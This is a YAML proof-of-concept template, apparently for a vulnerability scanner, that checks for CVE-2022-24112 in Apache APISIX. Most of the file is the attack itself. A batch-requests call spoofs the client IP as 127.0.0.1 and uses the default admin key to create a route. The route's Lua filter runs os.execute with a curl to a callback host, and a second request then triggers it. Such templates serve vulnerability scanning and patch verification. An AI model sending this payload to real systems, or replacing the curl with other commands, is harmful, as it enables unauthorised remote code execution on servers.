name: poc-yaml-apisix-dashboard-cve-2022-24112-rce
binding: 6a3fb562-3910-48b7-b4d9-df96093bc242
manual: true
detail:
    author: Xz
    links:
        - https://www.openwall.com/lists/oss-security/2022/02/11/3
        - https://twitter.com/sirifu4k1/status/1496043663704858625
        - https://apisix.apache.org/zh/docs/apisix/plugins/batch-requests
        - https://nvd.nist.gov/vuln/detail/CVE-2022-24112
    vulnerability:
        id: CT-386274
        level: critical
    description: A default configuration of Apache APISIX (with default API key) is vulnerable to remote code execution. An attacker can abuse the batch-requests plugin to send requests to bypass the IP restriction of Admin API. When the admin key was changed or the port of Admin API was changed to a port different from the data panel, the impact is lower. But there is still a risk to bypass the IP restriction of Apache APISIX's data panel. There is a check in the batch-requests plugin which overrides the client IP with its real remote IP. But due to a bug in the code, this check can be bypassed.
transport: http
set:
    r1: randomLowercase(25)
    reverse: newReverse()
    reverseDNS: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /apisix/batch-requests
            headers:
                Content-Type: application/json
            body: |
                {
                "headers":{
                    "X-Real-IP":"127.0.0.1",
                    "Content-Type":"application/json"
                },
                "timeout":1500,
                "pipeline":[
                    {
                    "method":"PUT",
                    "path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1",
                    "body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/{{r1}}\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl {{reverseDNS}}'); return true end\"}"
                    }
                ]
                }
        expression: response.status == 200 && response.body.bcontains(b"\"reason\":\"OK\"") && response.body.bcontains(b"\"status\":200") && response.headers["Content-Type"].contains("text/plain")
    r1:
        request:
            cache: true
            method: GET
            path: /api/{{r1}}
        expression: reverse.wait(5)
expression: r0() && r1()
